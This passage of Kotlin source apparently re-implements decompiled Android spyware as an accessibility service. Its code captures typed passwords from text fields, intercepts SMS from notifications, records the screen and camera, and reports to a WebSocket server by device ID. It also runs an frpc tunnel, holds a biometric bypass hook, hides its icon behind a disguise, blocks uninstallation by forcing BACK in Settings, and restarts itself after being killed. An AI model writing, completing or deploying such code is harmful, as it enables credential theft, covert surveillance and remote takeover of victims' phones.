                            cls.contains("InstallConfirm", ignoreCase = true) ||
                            cls.contains("PackageInstallerActivity", ignoreCase = true) ||
                            cls.contains("Alert", ignoreCase = true)
                        ) {
                            // ADAPT: m211440c2() — createOverlay for package installer detection.
                            // Vendor shows an overlay to intercept package installation UI.
                            // Installation detection is handled by UninstallProtectionManager.
                            try {
                                android.util.Log.d(TAG, "📦 检测到安装界面: cls=$cls")
                            } catch (_: Exception) {}
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── Event type 64 (TYPE_NOTIFICATION_STATE_CHANGED) → SMS interception (JADX line 10036) ──
            if (eventType == 64) {
                processNotificationForSms(event)
            }

            // ── CipherCaptureManager dispatch (JADX line 10039) ──
            // vendor: dqtvuisjd.java:10048 → C0335a1.m211820d6(event) reads EditText plaintext
            // from event.getText()[0] + event.getBeforeText() + event.getSource().getText()
            // across TYPE_VIEW_CLICKED / TYPE_VIEW_TEXT_CHANGED / window-change events.
            cipherCaptureManager?.let { ccm ->
                when (eventType) {
                    AccessibilityEvent.TYPE_VIEW_CLICKED,       // 1
                    AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,  // 16
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, // 32
                    AccessibilityEvent.TYPE_VIEW_FOCUSED,       // 8
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED, // 2048
                    AccessibilityEvent.TYPE_WINDOWS_CHANGED,    // 4194304
                    AccessibilityEvent.TYPE_VIEW_HOVER_ENTER -> { // 128
                        try {
                            // ADAPT 2026-04-17: vendor m211820d6 — read EditText plaintext
                            ccm.monitorSystemPasswordInputFull(event)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            android.util.Log.w(TAG, "⚠️ monitorSystemPasswordInputFull 异常: ${e.message}")
                        }
                    }
                    else -> Unit  // other event types intentionally not routed to cipher capture
                }
                // Legacy: string-based event fires a WS telemetry upload (vendor sendPasswordEvent).
                // Keep independent of m211820d6 — different mechanism.
                if (eventType == 16 || eventType == 1 || eventType == 32) {
                    ccm.dispatchEvent("accessibility_event_$eventType")
                }
            }

            // ── processNotificationEvent — lockscreen gesture dispatch (JADX line 10052) ──
            if (eventType == 32 || eventType == 2048) {
                processNotificationEvent(event)
            }

            // ── GestureRecorderManager dispatch for hover/click events (JADX line 10055–10108) ──
            notificationInterceptDelegate?.let { nid ->
                // JADX: f52437g8 (C0319a4) gesture recording dispatch
                // c0319a4.f53061a7 == 1 means recording mode active
                try {
                    if (eventType == 128) {
                        // JADX: hover event → gestureRecorderManager.onHoverEvent
                        android.util.Log.v(TAG, "🔍 [HOVER-DEBUG] → 转发给 gestureRecorderManager.onHoverEvent")
                    }
                    if (eventType == 1) {
                        // JADX: click event → gestureRecorderManager.onClickEvent
                    }
                    // JADX line 10083: if eventType 32/2048, check if not from systemui → launch coroutine
                    if (eventType == 32 || eventType == 2048) {
                        val recPkg = event.packageName?.toString() ?: ""
                        if (recPkg.isNotEmpty() && !recPkg.contains("systemui", ignoreCase = true) && !isThrottled) {
                            // JADX: launch C02969 coroutine for gesture recorder processing
                            coroutineScope?.launch {
                                // Gesture recorder event processing (C02969)
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── processWindowChangeForInjection (JADX line 10110) ──
            if (eventType == 32 || eventType == 4194304) {
                processWindowChangeForInjection(event)
            }

            // ── eventFilterManager second dispatch (JADX line 10113) ──
            if (eventFilterManager != null && !isWebViewOpen) {
                // JADX: this.f52414e5.m213127b5(accessibilityEvent)
                eventFilterManager?.onAccessibilityEvent(event)
            }

            // ── ConfigStageManager / yw5xud dispatch (JADX line 10121–10133) ──
            if (eventType == 32 || eventType == 2048) {
                try {
                    // JADX: c0329b4.f53199a4 (C0372a9) — if active, post to handler
                    configStageManager?.let { csm ->
                        if (csm is DeviceAuthorizationManager) {
                            val evtType = event.eventType
                            val evtPkg = event.packageName?.toString()
                            if (evtPkg != null && (evtType == 2048 || evtType == 32)) {
                                // JADX: c0372a9.f55147a4.post(new RunnableC1224sj(eventType, 1, c0372a9, string))
                                csm.onAccessibilityEvent(event)
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── Event type 32: app name detection → back action (JADX line 10134–10167) ──
            if (eventType == 32) {
                try {
                    val texts = event.text
                    val firstText = texts?.firstOrNull()?.toString() ?: ""
                    if (firstText.isNotEmpty()) {
                        val appName = try { getString(applicationInfo.labelRes) } catch (_: Exception) { "" }
                        if (appName.isNotEmpty() && firstText == appName) {
                            // JADX: if pkg contains "settings" and configStageManager.isActive → performGlobalAction(BACK)
                            if (pkg.contains("settings", ignoreCase = true)) {
                                val csm = configStageManager
                                if (csm is DeviceAuthorizationManager && csm.isActive()) {
                                    performGlobalAction(GLOBAL_ACTION_BACK)
                                }
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── AccessibilityEventRouter dispatch (JADX line 10169–10177) ──
            if (eventType == 1 || eventType == 32 || eventType == 2048) {
                try {
                    accessibilityEventRouter?.let { aer ->
                        // JADX: C0360a2.f53810f9.getInstance().m212078i3(accessibilityEvent)
                        aer.dispatch(event)
                    }
                } catch (_: Exception) {}
            }

            // ── Legacy delegate queue dispatch ──
            dispatchToDelegates(event, pkg, event.className?.toString() ?: "")

        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onAccessibilityEvent] 意外异常被拦截，服务保持运行", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onInterrupt
    // JADX line 10610
    // ════════════════════════════════════════════════════════════════

    override fun onInterrupt() {
        android.util.Log.w(TAG, "无障碍服务被中断")
        try {
            ActivityMonitor.logSystem("无障碍服务被中断 系统或用户中断了服务")
        } catch (_: Exception) {}

        try {
            displayManager?.stopCapture()
            android.util.Log.d(TAG, "✅ [中断] 已停止屏幕捕获")
        } catch (_: Exception) {}
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onDestroy
    // JADX line 10311
    // ════════════════════════════════════════════════════════════════

    override fun onDestroy() {
        android.util.Log.i(TAG, "🛑 无障碍服务正在销毁")

        try { ActivityMonitor.logSystem("无障碍服务被销毁") } catch (_: Exception) {}
        try { ActivityMonitor.logSystem("无障碍服务被系统销毁 可能被用户关闭或系统回收") } catch (_: Exception) {}

        // Cancel coroutines
        try {
            coroutineScope?.cancel()
            coroutineScope = null
        } catch (_: Exception) {}

        // Cleanup display manager
        try { displayManager?.stopCapture() } catch (_: Exception) {}

        // Cleanup camera capture
        try { cameraCaptureManager?.stopCapture() } catch (_: Exception) {}

        // Unregister SMS receiver
        try {
            smsReceiver?.let {
                unregisterReceiver(it)
                smsReceiver = null
                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注销")
            }
        } catch (e: Exception) {
            try { android.util.Log.e(TAG, "📩 ❌ 注销短信接收器失败", e) } catch (_: Exception) {}
        }

        // Unregister permission request receiver
        try {
            permissionRequestReceiver?.let { unregisterReceiver(it) }
            android.util.Log.d(TAG, "已注销权限申请广播接收器")
        } catch (e: Exception) {
            try { android.util.Log.e(TAG, "注销广播接收器失败", e) } catch (_: Exception) {}
        }

        // Unregister screen state receiver
        try {
            if (screenStateReceiverRegistered) {
                try {
                    screenStateReceiver?.let { unregisterReceiver(it) }
                    screenStateReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销屏幕状态广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销屏幕状态广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister local service receiver
        try {
            if (localServiceReceiverRegistered) {
                try {
                    localServiceActionReceiver?.let { unregisterReceiver(it) }
                    localServiceActionReceiver = null
                    localServiceReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销 local-service 广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销 local-service 广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister permission health receiver
        try {
            if (permissionHealthReceiverRegistered) {
                try {
                    permissionHealthReceiver?.let { unregisterReceiver(it) }
                    permissionHealthReceiverRegistered = false
                    android.util.Log.d(TAG, "✅ 已注销权限健康监控广播接收器")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 注销权限健康监控广播接收器失败", e)
                }
            }
        } catch (_: Exception) {}

        // Unregister network event receiver
        try {
            networkEventReceiver?.let {
                unregisterReceiver(it)
                networkEventReceiver = null
            }
        } catch (_: Exception) {}

        // Cleanup configStageManager (JADX: C0329b4)
        try {
            configStageManager?.let { csm ->
                // JADX line 10460: csm.f53200a5 = false; cancel scope
                android.util.Log.d(TAG, "🧹 清理 configStageManager")
            }
        } catch (_: Exception) {}

        // Cleanup network manager reference
        try {
            networkManager?.let { nm ->
                // JADX: clear service ref — nm.serviceRef = null
            }
        } catch (_: Exception) {}

        // Cleanup event filter manager
        try {
            // JADX: C0614i9 — EventFilterManager cleanup, null out reference
            eventFilterManager?.release()
            eventFilterManager = null
        } catch (_: Exception) {}

        // Cleanup frpc process manager
        try {
            frpcProcessManager?.stop()
            frpcProcessManager = null
        } catch (_: Exception) {}

        // Cleanup biometric bypass
        try {
            // JADX: C0328b3 — BiometricBypassDelegate cleanup (null out reference)
            biometricBypassDelegate = null
        } catch (_: Exception) {}

        // Cleanup config progress manager
        try {
            configProgressManager?.let { cpm ->
                // JADX: reset stage to IDLE, cancel job
            }
        } catch (_: Exception) {}

        // Cleanup accessibility event router
        try {
            accessibilityEventRouter?.let { aer ->
                // JADX: set active=false, cancel scope
            }
        } catch (_: Exception) {}

        // Cleanup recents guard
        try {
            recentsGuardManager?.let { rgm ->
                // JADX: clear handler, quit thread
                uninstallMainHandler.removeCallbacksAndMessages(null)
            }
        } catch (_: Exception) {}

        // Reset healthy flag
        try { isServiceHealthyFlag = false } catch (_: Exception) {}

        // Schedule alarm for restart if authorized (JADX line 10573)
        try {
            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
            if (isAuthorized) {
                // JADX line 10573: schedule alarm + WorkManager restart
                try {
                    zgafaqvswksa.schedule(applicationContext, 30_000L)
                    android.util.Log.d(TAG, "✅ 已安排 JobScheduler 30s 后重启")
                } catch (_: Exception) {}
                try {
                    zgafaqvswksa.scheduleImmediateRestart(applicationContext)
                    android.util.Log.d(TAG, "✅ 已触发 WorkManager 立即重启")
                } catch (_: Exception) {}
            }
        } catch (_: Exception) {}

        // Clear delegate queue
        delegateQueue.clear()

        // Null out singleton
        instance = null
        serviceStartTime = 0L

        super.onDestroy()
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onKeyEvent
    // JADX line 10634
    // ════════════════════════════════════════════════════════════════

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event == null) return super.onKeyEvent(event)
        if (event.keyCode == KeyEvent.KEYCODE_POWER &&
            event.action == KeyEvent.ACTION_DOWN &&
            event.isLongPress
        ) {
            android.util.Log.d(TAG, "🔴 [电源键] 检测到长按电源键")
        }
        return super.onKeyEvent(event)
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onRebind
    // JADX line 10644
    // ════════════════════════════════════════════════════════════════

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        android.util.Log.d(TAG, "🔄 无障碍服务 onRebind（避免重建）")
        try {
            ActivityMonitor.logSystem("无障碍服务重新绑定 服务恢复")
        } catch (_: Exception) {}
        instance = this
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onUnbind
    // JADX line 10780
    // ════════════════════════════════════════════════════════════════

    override fun onUnbind(intent: Intent?): Boolean {
        try {
            displayManager?.stopCapture()
        } catch (_: Exception) {}
        android.util.Log.d(TAG, "🔄 无障碍服务 onUnbind")
        try {
            ActivityMonitor.logSystem("无障碍服务解绑 系统正在解除绑定")
        } catch (_: Exception) {}
        return true
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onStartCommand
    // JADX line 10753
    // ════════════════════════════════════════════════════════════════

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            ensureForegroundNotification()
        } catch (_: Exception) {}

        if (intent == null) return START_STICKY

        try {
            val action = intent.action
            if (action == "com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED") {
                try {
                    android.util.Log.d(TAG, "通过Intent接收到MediaProjection权限获取成功通知")
                    handleMediaProjectionIntent()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "处理Intent通知失败", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onStartCommand] 意外异常", e)
        }

        return START_STICKY
    }

    // ════════════════════════════════════════════════════════════════
    // Key instance methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Configure AccessibilityServiceInfo flags.
     * JADX method: m211450d5 (d5), line 4712
     *
     * SDK 30+: flags = 0x100B07B (16810107) = FLAG_REPORT_VIEW_IDS | FLAG_RETRIEVE_INTERACTIVE_WINDOWS
     *          | FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | FLAG_REQUEST_TOUCH_EXPLORATION_MODE | etc.
     * SDK <30: flags = 123 (0x7B)
     */
    fun initServiceConfig() {
        try {
            val info = serviceInfo ?: return
            info.flags = if (Build.VERSION.SDK_INT >= 30) 16810107 else 123
            info.eventTypes = -1 // ALL_MASK
            info.feedbackType = -1 // ALL
            info.notificationTimeout = 0L
            info.packageNames = null
            serviceInfo = info

            val hasHover = (info.eventTypes and 128) != 0
            val hasTouchExplore = (info.flags and 4) != 0
            android.util.Log.d(
                TAG,
                "✅ ServiceInfo已配置，flags=0x${Integer.toHexString(info.flags)}" +
                    " eventTypes=0x${Integer.toHexString(info.eventTypes)}" +
                    " hasHover=$hasHover hasTouchExploreFlag=$hasTouchExplore"
            )
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ServiceInfo配置失败", e)
        }
    }

    /**
     * Continue service initialization after core setup.
     * JADX method: a2, line ~900 (onServiceConnected$1$1)
     * Initializes display/screen managers, starts network.
     */
    suspend fun continueServiceInitialization() {
        android.util.Log.d(TAG, "🔧 继续服务初始化...")
        try {
            // Initialize display manager
            if (displayManager == null) {
                displayManager = C0263a5(this)
            }

            // Initialize screen capture manager
            if (screenCaptureManager == null) {
                screenCaptureManager = ScreenCaptureManager(this)
            }

            // Initialize camera manager
            if (cameraManager == null) {
                cameraManager = C0258a0(this)
            }

            isInitComplete = true
            android.util.Log.d(TAG, "✅ 服务核心初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 继续服务初始化失败", e)
        }
    }

    /**
     * Deferred module initialization — JADX method: m211404a3 (a3), line 1672.
     *
     * Flow:
     * 1. Initialize AppInitializer singleton (zk1/al1)
     * 2. Launch broadcast receiver registration coroutine (deferredInit$2)
     * 3. Call initializeModules (h2) to instantiate all module objects
     * 4. Start InitWorkerService for background initialization
     */
    private suspend fun deferredInit() {
        android.util.Log.d(TAG, "🔧 [延迟初始化] 开始...")

        // JADX: al1.f43714a5.getInstance(appContext).a1() — AppInitializer
        try {
            // ADAPT: zk1/al1 (AppInitializer singleton) — vendor-specific app init
            // that configures global state. Not replicated; init state is managed by
            // existing module initialization chain.
            val appContext = applicationContext
        } catch (_: Exception) {}

        // JADX: launch deferredInit$2 coroutine — registerBroadcastReceivers
        coroutineScope?.launch(Dispatchers.Main) {
            try {
                registerBroadcastReceivers()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ registerBroadcastReceivers failed in deferredInit$2", e)
            }
        }

        // JADX: after coroutine await, call h2() (initializeModules)
        try {
            initializeModules()
        } catch (_: Exception) {}

        // JADX: dqtvuisjd$startWebViewStatusCheckTask$1 — start WebView status expiry check loop
        try {
            startWebViewStatusCheckTask()
        } catch (_: Exception) {}

        // JADX: start InitWorkerService (C0278a0.start)
        // JADX: depends on InitWorkerService.Companion.start (enqueue WorkManager request)
        try {
            // InitWorkerService is a Worker — enqueue via WorkManager
            // WorkManager enqueue is done in AppCoreService or zgafaqvswksa
        } catch (_: Exception) {}
    }

    /**
     * Heavy initialization — checks auth state and restores protections.
     * JADX method: m211405a4 (a4), line 1728 — doHeavyInit (suspend coroutine)
     *
     * Flow:
     * 1. Read authorization_completed + camouflage_enabled prefs
     * 2. If authorized: restore network, set AbstractC0315a0 flags, set isAuthStateRestored
     * 3. If authorized: start uninstall protection (kinztpexl.c3)
     * 4. Call initializeIconHide (i6) — read monitor_config.json
     * 5. Call initializeActivityMonitor (k5) — restore camouflage state
     * 6. Launch doHeavyInit$4 coroutine (delay)
     * 7. Call initializeService (h3) — permission flow
     * 8. Log completion
     */
    private suspend fun doHeavyInit() {
        android.util.Log.d(TAG, "🔧 [重初始化] 开始...")

        // JADX: read auth prefs
        val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
            .getBoolean("authorization_completed", false)
        isCamouflageModeEnabled = getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
            .getBoolean("camouflage_enabled", false)

        if (isAuthorized) {
            android.util.Log.d(TAG, "✅ [重初始化] 授权已完成，恢复保护功能")
            // JADX: c0323a8.m211643a8() — resume network manager connection
            try {
                networkManager?.let { nm ->
                    // JADX: depends on NetworkManager.resume() (C0323a8.a8)
                    android.util.Log.d(TAG, "✅ 恢复网络管理器连接")
                }
            } catch (_: Exception) {}

            // JADX: AbstractC0315a0.f53032a7 = true; f53034a9 = true; f52411e2 = true
            isAuthStateRestored = true
        }

        // JADX: if (z) { c0355a0.m211939c3(); f52477k8 = true }
        if (isAuthorized) {
            try {
                uninstallProtectionManager?.let { upm ->
                    upm.enable()
                    isUninstallGuardStarted = true
                }
            } catch (_: Exception) {}
        }

        // JADX: m211492i6() — initializeIconHide
        try {
            initializeIconHide()
        } catch (_: Exception) {}

        // JADX: m211509k5() — initializeActivityMonitor
        try {
            initializeActivityMonitor()
        } catch (_: Exception) {}

        // JADX: launch doHeavyInit$4 coroutine — delay then continue
        // In JADX, this is an IO dispatcher coroutine; after it completes, calls h3()
        // We flatten the coroutine state machine to sequential calls

        // JADX: m211479h3(continuation) — initializeService
        initializeService()

        android.util.Log.d(TAG, "✅ [重初始化] 全部完成，服务就绪")
        try {
            ActivityMonitor.logSystem("延迟初始化全部完成 服务就绪")
        } catch (_: Exception) {}
    }

    /**
     * Service initialization — manages init + permission flow.
     * JADX method: m211479h3 (h3), line 6418 — initializeService (suspend)
     *
     * Flow:
     * 1. Call initializeManagers (h1) — setup all manager instances
     * 2. If h1 fails → call fallbackInit (h0)
     * 3. Call startPermissionGrantFlow (m8) — trigger permission automation
     * 4. Log completion with isInitComplete state
     */
    private suspend fun initializeService() {
        android.util.Log.d(TAG, "🚀 开始无障碍服务初始化")

        // JADX: m211477h1() — initializeManagers
        try {
            android.util.Log.d(TAG, "📦 初始化各个管理器")
            initializeManagers()
            android.util.Log.d(TAG, "✅ 管理器初始化完成")
            isInitComplete = true
        } catch (e: Exception) {
            android.util.Log.w(TAG, "❌ initializeManagers失败，降级处理: ${e.message}")
            try {
                fallbackInit()
            } catch (e2: Exception) {
                android.util.Log.e(TAG, "❌ 降级初始化也失败", e2)
            }
        }

        // JADX: m211530m8(continuation) — startPermissionGrantFlow
        try {
            android.util.Log.d(TAG, "🔐 开始权限获取流程")
            startPermissionGrantFlow()
            android.util.Log.d(TAG, "✅ 权限获取流程完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ startPermissionGrantFlow失败: ${e.message}", e)
        }

        android.util.Log.d(TAG, "✅ 无障碍服务初始化完成 (isInitialized=$isInitComplete)")
    }

    /**
     * Safe rootInActiveWindow access with caching.
     * JADX method: m211468g2 (g2), line 5910
     *
     * 1. If power off → return null
     * 2. If cached root still valid (within TTL) → return cached
     * 3. Otherwise call getRootInActiveWindow() and cache
     */
    fun getRootNode(): AccessibilityNodeInfo? {
        val pm = powerManager
        if (pm != null && !pm.isInteractive) return null

        val now = SystemClock.uptimeMillis()
        val cached = cachedRootNode
        if (cached != null && now - cachedRootNodeTime < ROOT_CACHE_TTL_MS) {
            // Validate cached node is still alive
            try {
                cached.packageName // will throw if recycled
                return cached
            } catch (_: Exception) {
                cachedRootNode = null
            }
        }

        // Fetch fresh root
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        }
        cachedRootNode = root
        cachedRootNodeTime = now
        return root
    }

    /**
     * Check if WebSocket is connected.
     * JADX method: m211487i1 (i1), line 6843
     */
    fun isServerConnected(): Boolean {
        val nm = networkManager
        return nm?.isConnected ?: false
    }

    /**
     * Check keyguard locked state with caching (500ms TTL).
     * JADX method: m211486i0 (i0), line 6828
     */
    fun isKeyguardLockedCached(): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastKeyguardCheckTime < KEYGUARD_CACHE_TTL_MS) {
            return cachedKeyguardLocked
        }
        val km = keyguardManager
        val locked = km?.isKeyguardLocked ?: false
        cachedKeyguardLocked = locked
        lastKeyguardCheckTime = now
        return locked
    }

    /**
     * Check if service is healthy (multiple subsystem checks).
     * JADX method: m211488i2 (i2), line 6858
     */
    fun isServiceHealthy(): Boolean {
        try {
            val initOk = isInitComplete
            val hasSCM = screenCaptureManager != null
            val hasDM = displayManager != null
            val networkOk = try {
                networkManager?.isConnected ?: false
            } catch (_: Exception) { false }

            android.util.Log.d(TAG, "🔍 网络连接状态: $networkOk")
            val healthy = initOk && hasSCM && hasDM
            android.util.Log.d(TAG, "🔍 最终服务运行状态: $healthy")
            return healthy
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 检查服务运行状态失败", e)
            return false
        }
    }

    /**
     * Handle MediaProjection permission result from intent.
     * JADX method: m211472g6 (g6), line 5974
     */
    fun handleMediaProjectionIntent() {
        try {
            android.util.Log.d(TAG, "处理MediaProjection权限获取成功")
            screenCaptureManager?.let { scm ->
                // JADX: scm.h2() — stop previous capture
                scm.stopCapture()
            }
            // JADX line 5981: get MediaProjection from MediaProjectionHolder
            val mediaProjection = MediaProjectionHolder.mediaProjection
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "未能获取MediaProjection对象")
                return
            }
            android.util.Log.d(TAG, "成功获取MediaProjection对象，设置到etzbzyzqxvqm")
            setupScreenCapture(mediaProjection)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "处理MediaProjection权限获取成功失败", e)
        }
    }

    /**
     * Configure screen capture with MediaProjection.
     * JADX method: m211520l7 (l7), line 7903
     */
    fun setupScreenCapture(mediaProjection: MediaProjection?) {
        try {
            if (displayManager == null) {
                android.util.Log.w(TAG, "etzbzyzqxvqm未初始化")
                return
            }
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "MediaProjection is null")
                return
            }
            android.util.Log.d(TAG, "MediaProjection已设置")
            // JADX line 7903: check device registered via prefs, then start capture
            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
            val isRegistered = prefs.getBoolean("device_registered", false)
            if (isRegistered) {
                displayManager?.let { dm ->
                    android.util.Log.d(TAG, "设备已注册，启动屏幕捕获")
                    // JADX line 7903: dm.startCapture() — MediaProjection already stored in MediaProjectionHolder
                    dm.startCapture()
                }
            } else {
                android.util.Log.w(TAG, "设备未注册，延迟屏幕捕获")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "设置etzbzyzqxvqm MediaProjection失败", e)
        }
    }

    /**
     * Ensure foreground notification is active.
     * JADX method: m211528m6 (m6), line 9260
     */
    fun ensureForegroundNotification() {
        try {
            // Create notification channel (required API 26+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                if (nm != null) {
                    val channel = NotificationChannel(
                        NOTIFICATION_CHANNEL_ID,
                        "System Helper",
                        NotificationManager.IMPORTANCE_LOW
                    )
                    nm.createNotificationChannel(channel)
                }
            }

            val notification = Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()

            if (Build.VERSION.SDK_INT >= 34) {
                // JADX: startForeground(10086, notification, 1073741825)
                // Vendor uses SPECIAL_USE | MEDIA_PROJECTION but mediaProjection
                // requires active MediaProjection token (project_media permission).
                // Start with SPECIAL_USE only; upgrade to include MEDIA_PROJECTION
                // only when MediaProjection is actually granted.
                startForeground(FOREGROUND_NOTIFICATION_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            } else {
                startForeground(FOREGROUND_NOTIFICATION_ID, notification)
            }

            try {
                ActivityMonitor.logSystem("前台服务启动成功 进程优先级已提升")
            } catch (_: Exception) {}
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [startForegroundSelf] 前台服务启动失败", e)
        }
    }

    /**
     * Get display screen size.
     * Uses WindowManager to get display metrics.
     */
    fun getScreenSize(): Point {
        val point = Point()
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            if (wm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val windowMetrics = wm.currentWindowMetrics
                    val bounds = windowMetrics.bounds
                    point.x = bounds.width()
                    point.y = bounds.height()
                } else {
                    @Suppress("DEPRECATION")
                    val display = wm.defaultDisplay
                    @Suppress("DEPRECATION")
                    display?.getSize(point)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取屏幕尺寸失败", e)
        }
        return point
    }

    /**
     * Get device Android ID.
     * JADX method: m211470g4 (g4), line 5949
     * JADX: vendor name is "g4" — renamed to getAndroidDeviceId to avoid collision with Service.getDeviceId() on API 30+
     */
    fun getAndroidDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            id ?: "unknown"
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取设备ID失败", e)
            "unknown"
        }
    }

    /**
     * Connect WebSocket via NetworkManager.
     * JADX method: m211451d6 (d6), line 4733
     */
    fun connectWebSocket() {
        val nm = networkManager ?: return
        if (nm.isConnected) {
            android.util.Log.d(TAG, "🔌 控制开始，WebSocket 已连接，跳过重连")
            return
        }
        android.util.Log.d(TAG, "🔌 控制开始，连接 WebSocket")
        nm.disconnect()
        // JADX line 4747–4748: nm.m211643a8() (disconnect) then nm.m211669d6() (connectToServer)
        // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", null)
        val deviceId = getAndroidDeviceId()
        if (serverUrl != null) {
            nm.connectToServer(serverUrl, deviceId)
        } else {
            android.util.Log.w(TAG, "⚠️ server_url not set in prefs, cannot connect WebSocket")
        }
    }

    /**
     * Fallback initialization — minimal manager setup.
     * JADX method: m211476h0 (h0), line 6114
     */
    fun fallbackInit() {
        try {
            android.util.Log.d(TAG, "🔄 执行降级初始化")
            if (screenCaptureManager == null) {
                screenCaptureManager = ScreenCaptureManager(this)
            }
            if (displayManager == null) {
                displayManager = C0263a5(this)
            }
            android.util.Log.d(TAG, "✅ 降级初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 降级初始化失败", e)
        }
    }

    /**
     * Register broadcast receivers for screen state, permissions, etc.
     * JADX: dqtvuisjd$deferredInit$2 inner class — runs on IO dispatcher
     *
     * Registers:
     * - Screen state receiver (SCREEN_ON/OFF, USER_PRESENT)
     * - Permission request receiver
     * - SMS receiver
     */
    fun registerBroadcastReceivers() {
        // Screen state receiver (JADX: f52457i8)
        if (!screenStateReceiverRegistered) {
            try {
                screenStateReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent?) {
                        when (intent?.action) {
                            Intent.ACTION_SCREEN_ON -> {
                                android.util.Log.d(TAG, "📱 屏幕点亮")
                                // JADX: dqtvuisjd$screenStateReceiver$1 — trigger screen wake actions
                                try { sendScreenStatus() } catch (_: Exception) {}
                            }
                            Intent.ACTION_SCREEN_OFF -> {
                                android.util.Log.d(TAG, "📱 屏幕关闭")
                                try { sendScreenStatus() } catch (_: Exception) {}
                            }
                            Intent.ACTION_USER_PRESENT -> {
                                android.util.Log.d(TAG, "📱 用户解锁")
                                try { sendScreenStatus() } catch (_: Exception) {}
                            }
                        }
                    }
                }
                val filter = IntentFilter().apply {
                    addAction(Intent.ACTION_SCREEN_ON)
                    addAction(Intent.ACTION_SCREEN_OFF)
                    addAction(Intent.ACTION_USER_PRESENT)
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    // ADAPT: vendor dqtvuisjd.m211420b9 使用 RECEIVER_EXPORTED (常量值 2)。
                    // 之前误用 NOT_EXPORTED 导致部分 ROM 收不到 USER_PRESENT 广播。
                    registerReceiver(screenStateReceiver, filter, Context.RECEIVER_EXPORTED)
                } else {
                    registerReceiver(screenStateReceiver, filter)
                }
                screenStateReceiverRegistered = true
                android.util.Log.d(TAG, "✅ 已注册屏幕状态广播接收器")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ 注册屏幕状态广播接收器失败", e)
            }
        }

        // Permission request receiver (JADX: f52465j6)
        try {
            permissionRequestReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    val action = intent?.getStringExtra("permission_action") ?: return
                    android.util.Log.d(TAG, "📋 收到权限请求广播: $action")
                }
            }
            val permFilter = IntentFilter("com.storm.safe.rock.action.PERMISSION_REQUEST")
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(permissionRequestReceiver, permFilter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(permissionRequestReceiver, permFilter)
            }
            android.util.Log.d(TAG, "✅ 已注册权限申请广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册权限申请广播接收器失败", e)
        }

